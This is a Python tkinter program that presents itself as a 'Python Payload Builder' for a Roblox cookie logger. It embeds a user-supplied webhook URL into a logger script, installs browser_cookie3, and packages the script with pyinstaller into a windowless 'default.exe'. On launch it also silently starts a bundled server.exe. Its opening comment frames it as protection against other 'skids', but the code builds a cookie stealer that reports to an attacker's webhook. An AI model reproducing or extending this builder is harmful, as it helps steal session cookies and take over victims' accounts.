# made due to stop skids looking for a roblox cookie logger from running malware from other skids on discord

import tkinter as tk
import subprocess
import ctypes
import os

file_path = os.path.abspath(os.path.dirname(__file__))
window_main = tk.Tk(className=' Python Payload Builder                         BETA 0.8.1')
window_main.geometry("500x300")
window_main.resizable = False


frame_1 = tk.Frame(window_main, bg='#919191', width=500, height=50)
frame_1.pack()
frame_1.pack_propagate(0)

def buildr():
    with open(f"{file_path}\\switches\\webhook.txt", "w", encoding="utf-8") as f:
        f.write(f"{hoo.get()}")
    
    with open(f"{file_path}\\logger\\log.py") as f:
         lines = f.readlines()

         lines[0] = f'hook = "{hoo.get()}" \n'                    #embeds your to webhook log.py without encoding


         with open(f"{file_path}\\logger\\log.py", "w") as f:
            f.writelines(lines)

    os.system(f'start cmd.exe /c pyinstaller "{file_path}\\logger\\log.py" --noconfirm --onefile --windowed --name "default.exe"      ')

def update():
    os.system("start cmd.exe /c pip install pyinstaller && pip install requests && pip install browser_cookie3 && pip install threading && pip install pybase64")

#in frame_1
label_1 = tk.Label(frame_1, bg='#919191', text='webhook url: ')
label_1.pack(side=tk.LEFT)
hoo = tk.Entry(frame_1, width=200)
hoo.pack(side=tk.RIGHT)

if ctypes.windll.shell32.IsUserAnAdmin():
 build = tk.Button(window_main, text='Build', bg='#919191', width=200, height=4, command=lambda : buildr())
 build.pack(side=tk.BOTTOM)
else:
 build = tk.Button(window_main, text='please restart the program as administrator.', bg='#919191', width=200, height=4, command=lambda : buildr())
 build.pack(side=tk.BOTTOM)
pyinstall = tk.Button(window_main, text='Get Requirements', bg='#919191', width=200,)
pyinstall.pack(side=tk.BOTTOM)
try:
 os.startfile(f"{file_path}\\sv\\server.exe")
except:
 pass
def b64e():
    with open(f"{file_path}\\switches\\bool.txt", "r", encoding="utf-8") as f:
        enc = f.read()

        
    
    if enc == "True":
        print("green")
        with open(f"{file_path}\\switches\\bool.txt", "w", encoding="utf-8") as f:
         f.write("False")

    elif enc == "False":
        print("red")
        with open(f"{file_path}\\switches\\bool.txt", "w", encoding="utf-8") as f:
         f.write("True")

         



b64encode = tk.Button(window_main, text=f'encode webhook with base64? (broken) ', width=50, command=b64e)
b64encode.pack(pady=50)



#in frame_2


window_main.mainloop()